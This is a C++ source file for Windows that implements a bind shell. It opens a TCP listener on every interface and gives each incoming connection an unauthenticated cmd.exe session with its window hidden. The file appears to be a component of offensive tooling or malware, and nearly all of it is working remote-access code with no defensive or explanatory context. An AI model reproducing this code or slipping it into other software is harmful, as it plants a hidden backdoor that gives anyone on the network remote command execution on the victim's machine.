#include "pch.h"
#include "BindShell.h"

BindShell::BindShell(UINT16 port)
{
    this->port = port;
	WSAStartup(MAKEWORD(2, 2), &m_wsaData);
}

BindShell::~BindShell()
{
    WSACleanup();
}

DWORD APIENTRY BindShell::BingusSessionHandler(LPVOID lpParameter)
{
    SOCKET clientSocket = (SOCKET)lpParameter;
    RunCmdBindShell((LPWSTR)L"cmd.exe", (HANDLE)clientSocket, true, CREATE_NO_WINDOW);
    closesocket(clientSocket);

    return 0;
}

void BindShell::Bingus()
{
    SOCKET serverSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    if (serverSocket == INVALID_SOCKET)
        return;

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(port);

    if (bind(serverSocket, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) 
    {
        closesocket(serverSocket);
        OutputDebugString(L"bind error :(");

        return;
    }

    listen(serverSocket, SOMAXCONN);
    while (true)
    {
        int c = sizeof(sockaddr_in);
        sockaddr_in client;
        SOCKET clientSocket = WSAAccept(serverSocket, NULL, NULL, NULL, 0);
        if (clientSocket == INVALID_SOCKET)
            continue;

        // THIS SHIT IS BLOCKING
        // MessageBox(0, L"accepted!", L"bingus", 1);

        OutputDebugString(L"accepted!");
        CreateThread(NULL, 0, BingusSessionHandler, (LPVOID)clientSocket, 0, NULL);
    }

    closesocket(serverSocket);
}
